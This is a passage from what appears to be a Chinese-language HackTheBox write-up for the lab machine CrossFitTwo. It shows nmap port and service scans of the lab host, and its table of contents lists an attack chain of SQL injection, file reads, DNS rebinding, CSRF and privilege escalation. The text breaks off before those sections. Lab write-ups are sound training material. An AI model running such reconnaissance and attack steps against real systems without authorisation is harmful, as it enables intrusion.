<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>CrossFitTwo - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;322  10.10.10.232                                                                                                              端口扫描 需要全端口，22,80,895">
<meta property="og:type" content="article">
<meta property="og:title" content="CrossFitTwo - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;322  10.10.10.232                                                                                                              端口扫描 需要全端口，22,80,895">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051101.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051102.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051103.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051104.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051105.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051106.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051107.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051108.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051109.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051110.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051111.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051112.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051113.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051114.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051115.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051116.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051117.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051118.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051119.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051120.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051121.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051122.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051123.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051124.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051125.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051201.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051202.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051203.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051204.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051205.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051206.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051207.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051208.jpg">
<meta property="article:published_time" content="2021-05-12T06:37:41.000Z">
<meta property="article:modified_time" content="2021-08-16T05:27:20.685Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051101.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">CrossFitTwo - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">CrossFitTwo - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-05-12T06:37:41.000Z" itemprop="datePublished" class="page-time">
  2021-05-12
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-10-232"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.10.232</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#employees-crossfit-htb"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">employees.crossfit.htb</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#websocket"><span class="post-toc-number">4.</span> <span class="post-toc-text">websocket</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#chat"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">chat</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#websocket-client"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">websocket-client</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ws-min-js"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">ws.min.js</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#websocket-client-php"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">websocket-client.php</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sql注入"><span class="post-toc-number">5.</span> <span class="post-toc-text">sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dbs"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">dbs</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#employees"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">employees</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#employees-table"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">employees table</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#password-reset-table"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">password_reset table</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#password-reset"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">password_reset</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#文件读取"><span class="post-toc-number">6.</span> <span class="post-toc-text">文件读取</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-passwd"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-login-conf"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">&#x2F;etc&#x2F;login.conf</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-ssh-sshd-config"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-httpd-conf"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">&#x2F;etc&#x2F;httpd.conf</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-relayd-conf"><span class="post-toc-number">6.5.</span> <span class="post-toc-text">&#x2F;etc&#x2F;relayd.conf</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#crossfit-club-htb"><span class="post-toc-number">7.</span> <span class="post-toc-text">crossfit-club.htb</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#api-enum"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">api enum</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#signup"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">signup</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#signup-sh"><span class="post-toc-number">7.3.</span> <span class="post-toc-text">signup.sh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Unbound"><span class="post-toc-number">8.</span> <span class="post-toc-text">Unbound</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#var-unbound-etc-unbound-conf"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">&#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.conf</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#download-files"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">download files</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#status"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">status</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#crossfit-conf"><span class="post-toc-number">8.4.</span> <span class="post-toc-text">crossfit.conf</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#密码重置-amp-dns-rebind"><span class="post-toc-number">9.</span> <span class="post-toc-text">密码重置 &amp; dns rebind</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#add-forward"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">add_forward</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dnschef"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">dnschef</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dns-rebinding"><span class="post-toc-number">9.3.</span> <span class="post-toc-text">dns rebinding</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#CSRF"><span class="post-toc-number">10.</span> <span class="post-toc-text">CSRF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#password-reset-php"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">password-reset.php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#x-html"><span class="post-toc-number">10.2.</span> <span class="post-toc-text">x.html</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">11.</span> <span class="post-toc-text">user flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权信息"><span class="post-toc-number">12.</span> <span class="post-toc-text">提权信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#david-to-john"><span class="post-toc-number">13.</span> <span class="post-toc-text">david to john</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#node-modules搜索路径劫持"><span class="post-toc-number">13.1.</span> <span class="post-toc-text">node_modules搜索路径劫持</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#statbot-js"><span class="post-toc-number">13.2.</span> <span class="post-toc-text">statbot.js</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#app-js"><span class="post-toc-number">13.3.</span> <span class="post-toc-text">app.js</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exploit-sh"><span class="post-toc-number">13.4.</span> <span class="post-toc-text">exploit.sh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#john-to-root"><span class="post-toc-number">14.</span> <span class="post-toc-text">john to root</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#suid-log"><span class="post-toc-number">14.1.</span> <span class="post-toc-text">suid log</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#yubikey"><span class="post-toc-number">14.2.</span> <span class="post-toc-text">yubikey</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ssh私钥"><span class="post-toc-number">14.3.</span> <span class="post-toc-text">ssh私钥</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-changelist"><span class="post-toc-number">14.4.</span> <span class="post-toc-text">&#x2F;etc&#x2F;changelist</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#root-id-rsa"><span class="post-toc-number">14.5.</span> <span class="post-toc-text">root id_rsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">15.</span> <span class="post-toc-text">root flag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">16.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-CrossFitTwo-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">CrossFitTwo - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-05-12 14:37:41" datetime="2021-05-12T06:37:41.000Z"  itemprop="datePublished">2021-05-12</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><p><a href="https://www.hackthebox.eu/home/machines/profile/322" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/322</a></p>
</li>
<li><h2 id="10-10-10-232"><a href="#10-10-10-232" class="headerlink" title="10.10.10.232"></a>10.10.10.232</h2></li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051101.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p> 需要全端口，22,80,8953:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- 10.10.10.232</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 14:39 CST</span><br><span class="line">Nmap scan report for 10.10.10.232</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8953/tcp open  ub-dns-control</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 914.51 seconds</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn -p22,80,8953 10.10.10.232</span></span><br><span class="line"></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 15:08 CST</span><br><span class="line">WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value</span><br><span class="line">WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value</span><br><span class="line">Nmap scan report for employees.crossfit.htb (10.10.10.232)</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE             VERSION</span><br><span class="line">22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)</span><br><span class="line">|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)</span><br><span class="line">|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)</span><br><span class="line">80/tcp   open  http                (PHP 7.4.12)</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GetRequest, HTTPOptions:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-type: text/html; charset=UTF-8</span><br><span class="line">|     Date: Tue, 11 May 2021 07:08:01 GMT</span><br><span class="line">|     Server: OpenBSD httpd</span><br><span class="line">|     X-Powered-By: PHP/7.4.12</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang="zxx"&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset="UTF-8"&gt;</span><br><span class="line">|     &lt;meta name="description" content="Yoga StudioCrossFit"&gt;</span><br><span class="line">|     &lt;meta name="keywords" content="Yoga, unica, creative, html"&gt;</span><br><span class="line">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span><br><span class="line">|     &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;</span><br><span class="line">|     &lt;title&gt;CrossFit&lt;/title&gt;</span><br><span class="line">|     &lt;!-- Google Font --&gt;</span><br><span class="line">|     &lt;link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700&amp;display=swap" rel="stylesheet"&gt;</span><br><span class="line">|     &lt;link href="https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&amp;display=swap" rel="stylesheet"&gt;</span><br><span class="line">|     &lt;!-- Css Styles --&gt;</span><br><span class="line">|     &lt;link rel="stylesheet" href="css/bootstrap.min.css" type="text/css"&gt;</span><br><span class="line">|_    &lt;link rel="styleshe</span><br><span class="line">|_http-server-header: OpenBSD httpd</span><br><span class="line">|_http-title: Login</span><br><span class="line">8953/tcp open  ssl/ub-dns-control?</span><br><span class="line">| ssl-cert: Subject: commonName=unbound</span><br><span class="line">| Not valid before: 2021-01-11T07:01:10</span><br><span class="line">|_Not valid after:  2040-09-28T07:01:10</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.91%I=7%D=5/11%Time=609A2D63%P=x86_64-apple-darwin19.6.0%</span><br><span class="line">SF:r(GetRequest,3541,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nCo</span><br><span class="line">SF:nnection:\x20close\r\nContent-type:\x20text/html;\x20charset=UTF-8\r\nD</span><br><span class="line">SF:ate:\x20Tue,\x2011\x20May\x202021\x2007:08:01\x20GMT\r\nServer:\x20Open</span><br><span class="line">SF:BSD\x20httpd\r\nX-Powered-By:\x20PHP/7\.4\.12\r\n\r\n&lt;!DOCTYPE\x20html&gt;</span><br><span class="line">SF:\n&lt;html\x20lang=\"zxx\"&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\"</span><br><span class="line">SF:UTF-8\"&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\"description\"\x20content=\"Yo</span><br><span class="line">SF:ga\x20StudioCrossFit\"&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\"keywords\"\x20</span><br><span class="line">SF:content=\"Yoga,\x20unica,\x20creative,\x20html\"&gt;\n\x20\x20\x20\x20&lt;met</span><br><span class="line">SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal</span><br><span class="line">SF:e=1\.0\"&gt;\n\x20\x20\x20\x20&lt;meta\x20http-equiv=\"X-UA-Compatible\"\x20c</span><br><span class="line">SF:ontent=\"ie=edge\"&gt;\n\x20\x20\x20\x20&lt;title&gt;CrossFit&lt;/title&gt;\n\n\x20\x2</span><br><span class="line">SF:0\x20\x20&lt;!--\x20Google\x20Font\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20href=\</span><br><span class="line">SF:"https://fonts\.googleapis\.com/css\?family=PT\+Sans:400,700&amp;display=sw</span><br><span class="line">SF:ap\"\x20rel=\"stylesheet\"&gt;\n\x20\x20\x20\x20&lt;link\x20href=\"https://fo</span><br><span class="line">SF:nts\.googleapis\.com/css\?family=Oswald:400,500,600,700&amp;display=swap\"\</span><br><span class="line">SF:x20rel=\"stylesheet\"&gt;\n\n\x20\x20\x20\x20&lt;!--\x20Css\x20Styles\x20--&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.m</span><br><span class="line">SF:in\.css\"\x20type=\"text/css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesh</span><br><span class="line">SF:e")%r(HTTPOptions,3541,"HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\</span><br><span class="line">SF:r\nConnection:\x20close\r\nContent-type:\x20text/html;\x20charset=UTF-8</span><br><span class="line">SF:\r\nDate:\x20Tue,\x2011\x20May\x202021\x2007:08:01\x20GMT\r\nServer:\x2</span><br><span class="line">SF:0OpenBSD\x20httpd\r\nX-Powered-By:\x20PHP/7\.4\.12\r\n\r\n&lt;!DOCTYPE\x20</span><br><span class="line">SF:html&gt;\n&lt;html\x20lang=\"zxx\"&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20chars</span><br><span class="line">SF:et=\"UTF-8\"&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\"description\"\x20content</span><br><span class="line">SF:=\"Yoga\x20StudioCrossFit\"&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\"keywords\</span><br><span class="line">SF:"\x20content=\"Yoga,\x20unica,\x20creative,\x20html\"&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial</span><br><span class="line">SF:-scale=1\.0\"&gt;\n\x20\x20\x20\x20&lt;meta\x20http-equiv=\"X-UA-Compatible\"</span><br><span class="line">SF:\x20content=\"ie=edge\"&gt;\n\x20\x20\x20\x20&lt;title&gt;CrossFit&lt;/title&gt;\n\n\x</span><br><span class="line">SF:20\x20\x20\x20&lt;!--\x20Google\x20Font\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20h</span><br><span class="line">SF:ref=\"https://fonts\.googleapis\.com/css\?family=PT\+Sans:400,700&amp;displ</span><br><span class="line">SF:ay=swap\"\x20rel=\"stylesheet\"&gt;\n\x20\x20\x20\x20&lt;link\x20href=\"https</span><br><span class="line">SF:://fonts\.googleapis\.com/css\?family=Oswald:400,500,600,700&amp;display=sw</span><br><span class="line">SF:ap\"\x20rel=\"stylesheet\"&gt;\n\n\x20\x20\x20\x20&lt;!--\x20Css\x20Styles\x2</span><br><span class="line">SF:0--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"stylesheet\"\x20href=\"css/bootstr</span><br><span class="line">SF:ap\.min\.css\"\x20type=\"text/css\"&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\"st</span><br><span class="line">SF:yleshe");</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.06 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
